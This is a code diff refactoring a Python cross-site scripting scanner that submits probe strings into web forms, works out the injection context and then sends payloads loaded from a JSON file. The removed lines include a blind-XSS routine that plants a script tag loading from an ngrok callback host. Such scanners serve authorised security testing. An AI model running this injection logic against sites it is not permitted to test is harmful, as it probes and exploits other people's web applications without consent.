@@ -1,204 +1,100 @@
-import requests, json, time, os, concurrent.futures, uuid
-from datetime import datetime
+import json, os, concurrent.futures
+from .utils import is_real_endpoint, is_actionable, prepare_input_data, send_request, DATA_DIR
+from config import ScanConfig
 
 session = None
 probe = """crucible'"><;"""
 
-DANGER_TAGS = ['<script', '<img', '<iframe', '<svg', '<a ']
+try:
+    with open(os.path.join(DATA_DIR, 'XSS.json'), 'r') as f:
+        XSS_ARSENAL = json.load(f)['payload']
+except FileNotFoundError:
+    XSS_ARSENAL = []
+    print("[-] Warning: data/XSS.json not found.")
 
-class Config:
-    BLIND_XSS_DOMAIN = "mutually-spiculate-kaka.ngrok-free.app"
 
-def looks_Real_Endpoint(form):
-
-    action = form['action']
-    if not action:
-        return False
-
-    if action.startswith('javascript:'):
-        return False
-
-    if action.startswith('#'):
-        return False
-
-    return True
-
-def isActionable(params):
-
-    for param in params:
-
-        if param.get('type') in ['text', 'password', 'email', 'search', 'number', 'textarea']:
-            return True
-
-    return False
-
-def prepare_Input_Data(candidate, load):
-
-    data = {}
-    for cd in candidate['inputs']:
-
-        input_name = cd.get('name')
-        if not input_name:
-            continue
-
-        text_types = ['text', 'password', 'email', 'search', 'number', 'textarea']
-
-        if cd.get('type', '') in text_types:
-            data[input_name] = load
-        else:
-            data[input_name] = cd.get('value')
-
-    return data
-
-def send_Request(action, method, data, session = None):
-
-    try:
-        caller = session if session else requests
-        if method == 'post':
-            return caller.post(action, data=data)
-        return caller.get(action, params=data)
-    except requests.exceptions.Timeout:
-        print(f"[-] Request to {action} timed out.")
-        return None
-    except requests.exceptions.RequestException:
-        print(f"[-] Unexpected error occurred while sending request to {action}")
-        return None
-    except Exception as e:
-        print(f"[-] Request to {action} failed: {e}")
-        return None
-    
-def check_Reflected_XSS(candidate):
-
+def check_reflected_xss(candidate):
     breaker = candidate.get('breaker', '')
-    with open('data/XSS.json', 'r') as f:
-        payload = json.load(f)
+    arsenal = XSS_ARSENAL
+    findings = []
 
-    arsenal = payload['payload']
-    findings=[]
     for load in arsenal:
-
         mutated_load = f"{breaker}{load}"
 
         print(f"  [>] Testing payload: {mutated_load[:20]}.....")
 
-        data = prepare_Input_Data(candidate, mutated_load)
-        response = send_Request(candidate['action'] , candidate['method'], data, session)
-        tag_count = 0
-        for tag in DANGER_TAGS:
-            tag_count += response.text.lower().count(tag)
+        data = prepare_input_data(candidate, mutated_load)
+        response = send_request(candidate['action'], candidate['method'], data, session)
 
         if response is not None:
-
-            if mutated_load in response.text and tag_count>candidate.get('tags',0):
+            if mutated_load in response.text:
                 findings.append({
-                    'vulnerability type': 'Reflected XSS',
+                    'vulnerability_type': 'Reflected XSS',
                     'context': candidate.get('type', 'Unknown'),
-                    'url': candidate.get('found on', 'Unknown Source'),
+                    'url': candidate.get('found_on', 'Unknown Source'),
                     'payload': mutated_load,
                     'endpoint': candidate['action'],
                     'method': candidate['method'],
                     'data': data
                 })
+                break
 
-                break;
-            
     return findings
 
-def check_blind_XSS(candidate):
-    
-    tracking_id = str(uuid.uuid4())[:8]
-    callback_url = f"https://{Config.BLIND_XSS_DOMAIN}/bxss/{tracking_id}"
-    
-    payload = f"<script src='{callback_url}'></script>"
-    print(f"  [>] Injecting Blind XSS | Tracking ID: {tracking_id}")
-    
-    data = {}
-    
-    for cd in candidate['inputs']:
-        input_name = cd.get('name')
-        if not input_name:
-            continue
-        input_type = cd.get('type', '')
-        
-        if input_type == 'submit':
-             data[input_name] = cd.get('value', '')
-        elif input_type in ['text', 'password', 'email', 'search', 'number']:
-            data[input_name] = 'Crucible'
-        elif input_type in ['textarea', None, '']:
-            data[input_name] = payload
-        else:
-            data[input_name] = cd.get('value', '')
-            
-    send_Request(candidate['action'] , candidate['method'], data, session)
 
 def injector(forms, active_session):
-
     global session
     session = active_session
 
-    candidates = [f for f in forms if looks_Real_Endpoint(f) and isActionable(f['inputs'])]
+    candidates = [f for f in forms if is_real_endpoint(f) and is_actionable(f['inputs'])]
 
     vulnerable_pages = []
     exploitable = []
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=ScanConfig.THREAD_WORKERS) as executor:
+        probe_futures = {executor.submit(check_reflection, c): c for c in candidates}
 
-        probe = {executor.submit(reflection,c): c for c in candidates}
-
-        for future in concurrent.futures.as_completed(probe):
+        for future in concurrent.futures.as_completed(probe_futures):
             try:
                 probe_report = future.result()
                 if probe_report and probe_report.get('vulnerable'):
                     exploitable.append(probe_report)
-
             except Exception as e:
                 print(f"[-] Scouting Error: {e}")
 
         if exploitable:
-            reflected_attacks = {executor.submit(check_Reflected_XSS, t): t for t in exploitable}
-            
+            attacks = {executor.submit(check_reflected_xss, t): t for t in exploitable}
 
-            for future in concurrent.futures.as_completed(reflected_attacks):
-
+            for future in concurrent.futures.as_completed(attacks):
                 try:
                     findings = future.result()
                     if findings:
                         vulnerable_pages.extend(findings)
                 except Exception as e:
                     print(f"[-] Attack Thread Error: {e}")
-                    
-        blind_attacks = {executor.submit(check_blind_XSS, t): t for t in candidates}
-        for future in concurrent.futures.as_completed(blind_attacks):
-            try:
-                future.result()
-            except Exception as e:
-                print(f"[-] Blind XSS Thread Error: {e}")
 
     return vulnerable_pages
 
 
-def reflection(candidate):
-    
+def check_reflection(candidate):
     global probe
     load = probe
     findings = []
 
-    data = prepare_Input_Data(candidate, load)
-    response = send_Request(candidate['action'] , candidate['method'], data, session)
-    
+    data = prepare_input_data(candidate, load)
+    response = send_request(candidate['action'], candidate['method'], data, session)
+
     if response is None:
         return None
 
     txt = response.text
-    
+
     if load in txt:
-
         occurence_index = txt.find(load)
-
-        start_snippet = max(0, occurence_index-15)
+        start_snippet = max(0, occurence_index - 15)
         preceeding_part = txt[start_snippet:occurence_index]
 
-        rp = txt[occurence_index:occurence_index+len(load)]
+        rp = txt[occurence_index:occurence_index + len(load)]
 
         survival = {
             "lt_raw": "<" in rp,
@@ -210,32 +106,25 @@ def reflection(candidate):
             "quot_encoded": "&quot;" in rp or "&#34;" in rp
         }
 
-        strategy = {"vulnerable": False, "type": "Unknown", "breaker": "", 'tags': 0}
+        strategy = {"vulnerable": False, "type": "Unknown", "breaker": ""}
 
         if preceeding_part.strip().endswith('>'):
-            
             strategy["type"] = "HTML"
             if survival["lt_raw"] and survival["gt_raw"]:
                 strategy['breaker'] = ""
                 strategy['vulnerable'] = True
-                strategy['tags'] = sum([txt.lower().count(tag) for tag in DANGER_TAGS])
 
         elif '=' in preceeding_part or '="' in preceeding_part:
-            
             strategy["type"] = "Attribute"
-
             if survival["quot_raw"] and survival["gt_raw"]:
                 strategy["vulnerable"] = True
                 strategy["breaker"] = '">'
-                strategy['tags'] = sum([txt.lower().count(tag) for tag in DANGER_TAGS])
 
         elif "var" in preceeding_part or "script" in preceeding_part.lower():
             strategy["type"] = "Javascript"
-
             if survival["apos_raw"] and survival["semi_raw"]:
                 strategy["vulnerable"] = True
                 strategy["breaker"] = "';"
-                strategy['tags'] = sum([txt.lower().count(tag) for tag in DANGER_TAGS])
 
         candidate.update(strategy)
         return candidate
